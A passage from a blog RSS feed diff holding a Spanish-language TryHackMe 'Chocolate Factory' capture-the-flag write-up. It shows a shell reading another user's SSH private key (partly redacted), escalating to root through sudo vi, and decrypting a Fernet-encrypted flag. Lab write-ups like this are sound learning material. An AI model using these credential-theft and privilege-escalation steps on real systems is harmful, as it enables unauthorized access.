+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@chocolate-factory:/home/charlie$ ls -lah
+ls -lah
+total 40K
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; charlie charley 4.0K Oct  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 16:14 .
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root    root    4.0K Oct  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 12:08 ..
+-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; charlie charley 3.7K Apr  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; .bashrc
+drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; charlie charley 4.0K Sep  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 17:17 .cache
+drwx------ &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; charlie charley 4.0K Sep  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 17:17 .gnupg
+drwxrwxr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; charlie charley 4.0K Sep &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 18:08 .local
+-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; charlie charley  &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Apr  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; .profile
+-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; charlie charley 1.7K Oct  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 17:13 teleport
+-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; charlie charley  &lt;span class=&#34;m&#34;&gt;407&lt;/span&gt; Oct  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 17:13 teleport.pub
+-rw-r----- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; charlie charley   &lt;span class=&#34;m&#34;&gt;39&lt;/span&gt; Oct  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 17:11 user.txt
+www-data@chocolate-factory:/home/charlie$ ls -ld .
+ls -ld .
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; charlie charley &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 16:14 .
+www-data@chocolate-factory:/home/charlie$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@chocolate-factory:/home/charlie$ cat teleport
+cat teleport
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+-----END RSA PRIVATE KEY-----
+www-data@chocolate-factory:/home/charlie$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Acceso a atraves del servicio ssh logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/Screenshot_20210119_204431.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;vi&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/vi/#sudo&#34;&gt;&lt;strong&gt;vi&lt;/strong&gt;&lt;/a&gt; para obtener una shell root.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/Screenshot_20210119_204847.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Encontramos el archivo &lt;code&gt;root.py&lt;/code&gt; el cual pide una clave para poder desencrpitar nuestra flag, intentamos ejecutarlo en la maquina pero mostraba error, por lo que ejecutamos el archivo localmente eliminando lo innecesario y reparando el error (bytes en variable &lt;code&gt;encrypted_mess&lt;/code&gt;).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:root.py&#34; data-lang=&#34;python:root.py&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;cryptography.fernet&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Fernet&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Fernet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-VkgXhFf6sAEcA[... REDACTED ...]ABXeQuvhcGSQzY=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;encrypted_mess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5l[... REDACTED ...]_xbIQkQojwf_unpPAAKyJQDHNvQaJ&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;dcrypt_mess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypted_mess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;mess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dcrypt_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ejecutamos el script y logramos obtener nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/Screenshot_20210119_205803.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Es posible de manera rapida con la clave (key) y token desencriptar la informacion con &lt;a href=&#34;https://asecuritysite.com/encryption/ferdecode&#34;&gt;&lt;strong&gt;Fernet (Decode)&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/Screenshot_20210119_210048.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/chocolatfactory/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/chocolatfactory/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>Fernet</category>
+            
+          
+            
+              <category>criptography</category>
+            
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>steghide</category>
+            
+          
+            
+              <category>steganography</category>
+            
+          
+            
+              <category>john</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>TryHackMe - Overpass 3 - Hosting</title>
